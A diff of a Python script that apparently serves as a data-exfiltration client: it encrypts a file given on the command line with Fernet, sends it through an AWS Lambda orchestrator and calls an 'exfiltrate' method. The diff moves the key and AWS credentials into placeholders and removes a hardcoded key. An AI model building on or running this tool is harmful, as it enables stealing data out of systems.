@@ -6,10 +6,16 @@ import math
 import socket
 from cryptography.fernet import Fernet
 
+key = b'<FERNET_KEY>'
+orchestrator_function_name = '<ORCHESTRATOR_FUNCTION_NAME>'
+aws_access_key_id = '<AWS_ACCESS_KEY_ID>'
+aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>'
+region = '<REGION>'
+
 class Client():
 
 	partitionSize = 100 #Change for desired partition size
-	f = Fernet(b'fRL9lZbgLl56h7RRVfZl7yh0ExruI5wSh9U9YruS0w0=')
+	f = Fernet(key)
 
 	def setFileName(self, filePath):
 		self.filePath = filePath
@@ -39,7 +45,7 @@ class Client():
 		orqPayload_json = json.dumps(orqPayload)
 
 		#----------Orchestrator call with desired partitions--------------
-		orq_response = self.aws_lambda.invoke(FunctionName = '<ORCHESTRATOR_FUNCTION_NAME>', Payload = orqPayload_json)
+		orq_response = self.aws_lambda.invoke(FunctionName = orchestrator_function_name, Payload = orqPayload_json)
 
 		#----------Parsing the orchestrator answer, here we grab the lambda functions list--------------
 		bytes_list = orq_response['Payload'].read()
@@ -81,7 +87,7 @@ class Client():
 
 
 client = Client()
-client.awsConnect('<ACCESS_KEY_ID>','<SECRET_ACCESS_KEY_ID>','<REGION>')
+client.awsConnect(aws_access_key_id, aws_secret_access_key, region)
 client.setFileName(str(sys.argv[1]))
 client.exfiltrate()
 
